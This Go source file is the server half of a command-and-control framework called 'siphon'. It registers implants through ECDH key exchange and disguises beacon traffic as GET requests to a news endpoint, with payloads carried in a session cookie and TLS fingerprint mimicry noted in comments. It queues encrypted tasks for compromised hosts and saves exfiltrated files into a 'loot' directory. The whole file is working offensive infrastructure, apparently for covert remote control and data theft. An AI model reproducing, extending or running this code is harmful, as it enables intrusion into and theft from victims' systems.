package server

import (
	"crypto/ecdh"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"siphon/shared"
)

// Implant tracks a connected implant's state on the server side.
type Implant struct {
	ID         string
	Hostname   string
	Username   string
	OS         string
	Arch       string
	SessionKey []byte
	LastSeen   time.Time
	TaskQueue  []*shared.Task
	Results    []*shared.TaskResult
}

const maxImplants = 1000

// C2Server is the main command-and-control server.
type C2Server struct {
	mu         sync.RWMutex
	implants   map[string]*Implant
	serverKey  *ecdh.PrivateKey
	certFile   string
	keyFile    string
	beaconPath string
	submitPath string
	authToken  string
}

// NewC2Server creates a new C2Server with the given ECDH private key and TLS paths.
func NewC2Server(serverKey *ecdh.PrivateKey, certFile, keyFile, beaconPath, submitPath, authToken string) *C2Server {
	return &C2Server{
		implants:   make(map[string]*Implant),
		serverKey:  serverKey,
		certFile:   certFile,
		keyFile:    keyFile,
		beaconPath: beaconPath,
		submitPath: submitPath,
		authToken:  authToken,
	}
}

// Start registers routes and begins serving HTTPS on addr.
func (s *C2Server) Start(addr string) error {
	if err := os.MkdirAll("loot", 0750); err != nil {
		return fmt.Errorf("handlers: failed to create loot dir: %w", err)
	}

	mux := http.NewServeMux()
	mux.HandleFunc(s.beaconPath, s.handleBeacon)
	mux.HandleFunc(s.submitPath, s.handleSubmit)

	srv := &http.Server{
		Addr:         addr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  120 * time.Second,
		// Disable HTTP/2 so that uTLS Chrome fingerprint (which advertises h2)
		// falls back to HTTP/1.1 via ALPN negotiation. Go's http.Transport with
		// custom DialTLSContext only supports HTTP/1.x.
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)),
	}

	log.Printf("[server] listening on %s (HTTPS)", addr)
	return srv.ListenAndServeTLS(s.certFile, s.keyFile)
}

// handleBeacon handles GET /api/news — the implant beacon endpoint.
func (s *C2Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Read the "session" cookie which carries the base64-encoded JSON Envelope.
	cookie, err := r.Cookie("session")
	if err != nil || cookie.Value == "" {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	if len(cookie.Value) > 65536 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	raw, err := base64.StdEncoding.DecodeString(cookie.Value)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	var env shared.Envelope
	if err := json.Unmarshal(raw, &env); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	nonce, err := hex.DecodeString(env.Nonce)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	ciphertext, err := hex.DecodeString(env.Ciphertext)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	if !shared.VerifyEnvelope(&env, s.authToken) {
		http.NotFound(w, r)
		return
	}

	var implant *Implant

	if env.PubKey != "" {
		// First check-in: derive session key from the implant's ephemeral pubkey.
		clientPubBytes, err := hex.DecodeString(env.PubKey)
		if err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
		sessionKey, err := DeriveSessionKey(s.serverKey, clientPubBytes)
		if err != nil {
			log.Printf("[beacon] key derivation failed: %v", err)
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}

		plaintext, err := Decrypt(sessionKey, nonce, ciphertext)
		if err != nil {
			log.Printf("[beacon] decrypt failed on initial check-in: %v", err)
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}

		var beacon shared.Beacon
		if err := json.Unmarshal(plaintext, &beacon); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}

		implant = &Implant{
			ID:         beacon.ID,
			Hostname:   beacon.Hostname,
			Username:   beacon.Username,
			OS:         beacon.OS,
			Arch:       beacon.Arch,
			SessionKey: sessionKey,
			LastSeen:   time.Now(),
		}

		s.mu.Lock()
		if len(s.implants) >= maxImplants {
			s.mu.Unlock()
			log.Printf("[beacon] max implants reached, rejecting %s", shortID(beacon.ID))
			http.Error(w, "service unavailable", http.StatusServiceUnavailable)
			return
		}
		if existing, ok := s.implants[beacon.ID]; ok {
			existing.SessionKey = sessionKey
			existing.Hostname = beacon.Hostname
			existing.Username = beacon.Username
			existing.OS = beacon.OS
			existing.Arch = beacon.Arch
			existing.LastSeen = time.Now()
			implant = existing
		} else {
			s.implants[beacon.ID] = implant
		}
		s.mu.Unlock()

		log.Printf("[beacon] new implant registered: %s (%s/%s)",
			shortID(beacon.ID), beacon.OS, beacon.Arch)

		w.WriteHeader(http.StatusOK)
		return
	} else {
		if env.ID == "" {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}

		s.mu.RLock()
		implant = s.implants[env.ID]
		s.mu.RUnlock()

		if implant == nil {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}

		_, err := Decrypt(implant.SessionKey, nonce, ciphertext)
		if err != nil {
			log.Printf("[beacon] decrypt failed for %s: %v", shortID(env.ID), err)
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}
	}

	if implant == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	// Update LastSeen.
	s.mu.Lock()
	implant.LastSeen = time.Now()

	// Pop the first task from the queue if any.
	var task *shared.Task
	if len(implant.TaskQueue) > 0 {
		task = implant.TaskQueue[0]
		implant.TaskQueue = implant.TaskQueue[1:]
	}
	s.mu.Unlock()

	if task == nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("{}"))
		return
	}

	// Encrypt the task and return it as a JSON Envelope.
	taskJSON, err := json.Marshal(task)
	if err != nil {
		log.Printf("[beacon] marshal task failed: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	tNonce, tCipher, err := Encrypt(implant.SessionKey, taskJSON)
	if err != nil {
		log.Printf("[beacon] encrypt task failed: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	resp := shared.Envelope{
		Nonce:      hex.EncodeToString(tNonce),
		Ciphertext: hex.EncodeToString(tCipher),
	}
	shared.SignEnvelope(&resp, s.authToken)

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	if err := json.NewEncoder(w).Encode(resp); err != nil {
		log.Printf("[beacon] encode response failed: %v", err)
	}
}

// handleSubmit handles POST /api/submit — the implant result submission endpoint.
func (s *C2Server) handleSubmit(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	r.Body = http.MaxBytesReader(w, r.Body, 10*1024*1024) // 10 MB limit

	var env shared.Envelope
	if err := json.NewDecoder(r.Body).Decode(&env); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	nonce, err := hex.DecodeString(env.Nonce)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	ciphertext, err := hex.DecodeString(env.Ciphertext)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	if !shared.VerifyEnvelope(&env, s.authToken) {
		http.NotFound(w, r)
		return
	}

	// Identify implant via Envelope.ID field.
	s.mu.RLock()
	implant := s.implants[env.ID]
	var sessionKeyCopy []byte
	if implant != nil {
		sessionKeyCopy = make([]byte, len(implant.SessionKey))
		copy(sessionKeyCopy, implant.SessionKey)
	}
	s.mu.RUnlock()

	if implant == nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	plaintext, err := Decrypt(sessionKeyCopy, nonce, ciphertext)
	if err != nil {
		log.Printf("[submit] decrypt failed for %s: %v", shortID(implant.ID), err)
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	var result shared.TaskResult
	if err := json.Unmarshal(plaintext, &result); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	// Auto-decode uploaded files: if the task was an "upload" and the result is
	// base64 data, decode it and write to loot/<implantID>/<filename>.
	s.autoSaveUpload(implant, &result, sessionKeyCopy)

	const maxResults = 1000
	s.mu.Lock()
	implant.Results = append(implant.Results, &result)
	if len(implant.Results) > maxResults {
		implant.Results = implant.Results[len(implant.Results)-maxResults:]
	}
	s.mu.Unlock()

	log.Printf("[submit] result from %s task=%s success=%v", shortID(implant.ID), shortID(result.TaskID), result.Success)

	w.WriteHeader(http.StatusOK)
}

// autoSaveUpload checks if the result is from an upload task. If so, it decodes
// the base64 file data and saves it to loot/<implantID>/<taskID>.bin.
func (s *C2Server) autoSaveUpload(implant *Implant, result *shared.TaskResult, sessionKey []byte) {
	if !result.Success || result.Type != "upload" {
		return
	}

	data, err := base64.StdEncoding.DecodeString(result.Output)
	if err != nil {
		return
	}

	safeID := filepath.Base(implant.ID)
	safeTaskID := filepath.Base(result.TaskID)
	lootDir := filepath.Join("loot", safeID)
	if err := os.MkdirAll(lootDir, 0750); err != nil {
		log.Printf("[loot] mkdir error: %v", err)
		return
	}

	// Encrypt loot at rest using a key derived from the implant's session key.
	lootNonce, lootCT, encErr := Encrypt(sessionKey, data)
	if encErr != nil {
		log.Printf("[loot] encrypt error: %v", encErr)
		return
	}
	outPath := filepath.Join(lootDir, safeTaskID+".enc")
	// Write nonce (12 bytes) || ciphertext.
	blob := make([]byte, 0, len(lootNonce)+len(lootCT))
	blob = append(blob, lootNonce...)
	blob = append(blob, lootCT...)
	if err := os.WriteFile(outPath, blob, 0640); err != nil {
		log.Printf("[loot] write error: %v", err)
		return
	}

	log.Printf("[loot] saved %d bytes (encrypted) → %s", len(data), outPath)
	result.Output = fmt.Sprintf("file saved: %s (%d bytes, encrypted)", outPath, len(data))
}

// GetImplants returns a snapshot of all registered implants as value copies. Safe for concurrent use.
func (s *C2Server) GetImplants() []Implant {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]Implant, 0, len(s.implants))
	for _, imp := range s.implants {
		cpy := *imp
		cpy.SessionKey = make([]byte, len(imp.SessionKey))
		copy(cpy.SessionKey, imp.SessionKey)
		cpy.TaskQueue = make([]*shared.Task, len(imp.TaskQueue))
		copy(cpy.TaskQueue, imp.TaskQueue)
		cpy.Results = make([]*shared.TaskResult, len(imp.Results))
		copy(cpy.Results, imp.Results)
		out = append(out, cpy)
	}
	return out
}

// GetImplant returns a deep copy of the implant with the given ID, or nil.
// Slice fields (TaskQueue, Results) are deep-copied so the caller's copy has
// independent backing arrays and is safe to read without holding the mutex.
func (s *C2Server) GetImplant(id string) *Implant {
	s.mu.RLock()
	defer s.mu.RUnlock()
	imp := s.implants[id]
	if imp == nil {
		return nil
	}
	cpy := *imp
	cpy.SessionKey = make([]byte, len(imp.SessionKey))
	copy(cpy.SessionKey, imp.SessionKey)
	cpy.TaskQueue = make([]*shared.Task, len(imp.TaskQueue))
	copy(cpy.TaskQueue, imp.TaskQueue)
	cpy.Results = make([]*shared.TaskResult, len(imp.Results))
	copy(cpy.Results, imp.Results)
	return &cpy
}

// QueueTask appends a task to the implant's queue. Safe for concurrent use.
func (s *C2Server) QueueTask(implantID string, task *shared.Task) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	imp, ok := s.implants[implantID]
	if !ok {
		return false
	}
	imp.TaskQueue = append(imp.TaskQueue, task)
	return true
}

// shortID returns the first 8 characters of id, or the full id if shorter.
func shortID(id string) string {
	if len(id) > 8 {
		return id[:8]
	}
	return id
}
